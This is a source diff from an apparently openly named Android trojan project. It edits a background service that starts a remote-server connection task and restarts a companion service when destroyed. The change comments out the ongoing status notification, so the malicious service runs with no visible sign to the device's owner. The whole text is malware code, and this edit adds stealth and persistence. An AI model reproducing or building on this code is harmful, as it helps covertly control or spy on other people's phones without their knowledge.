@@ -1,37 +1,29 @@
-package trojan.android.android_trojan.Action.Service;
+package trojan.android.android_trojan.Action;
 
-import android.app.Notification;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
-import android.support.v4.app.NotificationCompat;
 import android.util.Log;
-
-import trojan.android.android_trojan.Action.AsyncTask.ConnectionServerTask;
-import trojan.android.android_trojan.Action.Tools;
-import trojan.android.android_trojan.R;
 
 
 public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
 
     private ConnectionServerTask connectionServerTask;
-    private int notificationid = 1;
-    private NotificationManager notificationManager;
+    //private int notificationid = 1;
+    //private NotificationManager notificationManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "onCreate");
         connectionServerTask = new ConnectionServerTask(getApplicationContext());
-        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        //notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        showNotification();
+        //showNotification();
         if (connectionServerTask.isCancelled() ||
                 !connectionServerTask.getStatus().toString().equals("RUNNING"))
             connectionServerTask.execute();
@@ -43,7 +35,7 @@ public class BackgroundService extends Service {
     public void onDestroy() {
         super.onDestroy();
         connectionServerTask.cancel(true);
-        notificationManager.cancel(notificationid);
+        //notificationManager.cancel(notificationid);
         if (Tools.isMyServiceRunning(NotificationService.class, getApplicationContext()))
             startService(new Intent(this, NotificationService.class));
         Log.d(TAG, "onDestroy");
@@ -54,6 +46,7 @@ public class BackgroundService extends Service {
         return null;
     }
 
+    /*
     private void showNotification(){
         NotificationCompat.Builder mBuilder =
                 new NotificationCompat.Builder(this)
@@ -72,5 +65,5 @@ public class BackgroundService extends Service {
         Notification notification = mBuilder.build();
         notification.flags = Notification.FLAG_NO_CLEAR | Notification.FLAG_ONGOING_EVENT;
         notificationManager.notify(notificationid, notification);
-    }
+    }*/
 }
